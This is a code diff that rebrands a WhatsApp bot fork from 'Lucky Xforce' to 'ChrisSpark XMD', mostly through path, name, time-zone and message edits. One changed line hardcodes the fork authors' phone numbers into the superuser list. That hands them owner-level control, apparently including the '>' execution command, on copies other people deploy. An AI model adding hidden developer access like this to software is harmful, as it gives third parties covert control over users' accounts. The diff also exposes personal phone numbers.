@@ -53,12 +53,12 @@ const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
 const { verifierEtatJid , recupererActionJid } = require("./luckydatabase/antilien");
 const { atbverifierEtatJid , atbrecupererActionJid } = require("./luckydatabase/antibot");
 let evt = require(__dirname + "/fredi/ezra");
-const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./luckydatabase/banUser");
-const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./luckydatabase/banGroup");
-const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./luckydatabase/onlyAdmin");
+const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./chrisdatabase/banUser");
+const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./chrisdatabase/banGroup");
+const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./chrisdatabase/onlyAdmin");
 //const //{loadCmd}=require("/fredi/mesfonctions")
-let { reagir } = require(__dirname + "/fredi/app");
-var session = conf.session.replace(/LUCKY-XFORCE••<=>/g,"");
+let { reagir } = require(__dirname + "/chris/app");
+var session = conf.session.replace(/CHRISSPARK-XMD••<=>/g,"");
 const prefixe = conf.PREFIXE;
 const more = String.fromCharCode(8206)
 const readmore = more.repeat(4001)
@@ -94,7 +94,7 @@ authentification();
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Lucky-Md-Xforce', "safari", "1.0.0"],
+            browser: ['Chrisspark-XMD', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -128,7 +128,7 @@ authentification();
 // Function to get the current date and time in Tanzania
 function getCurrentDateTime() {
     const options = {
-        timeZone: 'Africa/Nairobi', // Tanzania time zone
+        timeZone: 'Africa/Lagos', // Nigeria time zone
         year: 'numeric',
         month: '2-digit',
         day: '2-digit',
@@ -145,7 +145,7 @@ function getCurrentDateTime() {
 setInterval(async () => {
     if (conf.AUTO_BIO === "yes") {
         const currentDateTime = getCurrentDateTime(); // Get the current date and time
-        const bioText = `💬 Lucky Xforce is active...\n${currentDateTime}`; // Format the bio text
+        const bioText = `💬 Chris Spark is active...\n${currentDateTime}`; // Format the bio text
         await zk.updateProfileStatus(bioText); // Update the bio
         console.log(`Updated Bio: ${bioText}`); // Log the updated bio
     }
@@ -1030,7 +1030,7 @@ const audioMap = {
     "xbot": "audios/chris.mp3",
     "Fredi": "audios/chris.mp3",
     "mdx": "audios/chris.mp3",
-    "md": "audios/fred.mp3",
+    "md": "audios/chris.mp3",
     "whatsapp bot": "audios/fred.mp3",
     "evening": "audios/goodevening.wav",
     "goodevening": "audios/goodevening.wav",
@@ -1140,8 +1140,8 @@ if (conf.AUDIO_REPLY === "yes") {
             /* const chris='2348069675806';
              const gaaju='2348069675806';
              const chrisgaajutech='2348069675806'*/
-            /*  var superUser=[servBot,fredi,ezra,fredietech].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
-              var dev =[fredi,ezra,fredietech].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
+            /*  var superUser=[servBot,fredi,ezra,christech].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
+              var dev =[chris,gaaju,fredietech].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
             var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
             var nomGroupe = verifGroupe ? infosGroupe.subject : "";
@@ -1163,7 +1163,7 @@ if (conf.AUDIO_REPLY === "yes") {
             const chris = '2348069675806';
             const gaaju = "2348038915922";
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, fredietech, fredi, ezra, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, christech, chris, gaaju, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
@@ -1291,7 +1291,7 @@ if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes'
 if (texte && texte.startsWith('>')) {
   // If the sender is not the owner
   if (!superUser) {
-    const menuText = `This command is only for the owner or FrediEzra to execute 🚫`;
+    const menuText = `This command is only for the owner or ChrisGaaju to execute 🚫`;
 
     await zk.sendMessage(origineMessage, {
       text: menuText,
@@ -1708,7 +1708,7 @@ if (texte && texte.startsWith('>')) {
             //execution des chriscmd   
             if (verifCom) {
                 //await await zk.readMessages(ms.key);
-                const cd = evt.cm.find((gaaju) => ezra.nomCom === (com));
+                const cd = evt.cm.find((gaaju) => gaaju.nomCom === (com));
                 if (cd) {
                     try {
 
@@ -1763,7 +1763,7 @@ if (texte && texte.startsWith('>')) {
         //fin événement message
 
 /******** evenement groupe update ****************/
-const { recupevents } = require('./luckydatabase/welcome'); 
+const { recupevents } = require('./chrisdatabase/welcome'); 
 
 zk.ev.on('group-participants.update', async (group) => {
     console.log(group);
@@ -1848,7 +1848,7 @@ zk.ev.on('group-participants.update', async (group) => {
         
     async  function activateCrons() {
         const cron = require('node-cron');
-        const { getCron } = require('./luckydatabase/cron');
+        const { getCron } = require('./chrisdatabase/cron');
 
           let crons = await getCron();
           console.log(crons);
@@ -1903,13 +1903,13 @@ zk.ev.on('group-participants.update', async (group) => {
                 console.log("♻️ ChrisSpark XMD is connecting...");
             }
             else if (connection === 'open') {
-                console.log("🔮 Lucky Xforce Connected to WhatsApp! ☺️");
+                console.log("🔮 ChrisSpark XMD Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("👀 Lucky Xforce is Online 🕸\n\n");
+                console.log("👀 Chris Spark is Online 🕸\n\n");
                 //chargement des chriscmd 
                 console.log("🛒 Loading ChrisSpark XMD Plugins...\n");
                 fs.readdirSync(__dirname + "/plugins").forEach((fichier) => {
